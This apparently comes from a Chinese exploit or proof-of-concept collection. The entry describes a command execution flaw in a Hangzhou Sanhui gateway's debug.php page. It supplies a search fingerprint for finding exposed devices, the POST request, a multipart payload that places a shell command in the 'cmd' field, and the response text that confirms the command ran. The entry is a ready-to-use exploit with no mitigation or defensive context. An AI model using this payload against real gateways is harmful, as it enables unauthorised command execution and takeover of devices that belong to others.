# 杭州三汇网关debugrce漏洞

杭州三汇网关debug ｜ 命令执行 ｜ —
- **指纹**：`body="text ml10 mr20"`
- **请求**：`POST /debug.php HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="comdtype"
1
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="cmd"
echo djwaodjoajdwadj23
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
Content-Disposition: form-data; name="run"
------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
```
- **响应特征**：200 djwaodjoajdwadj23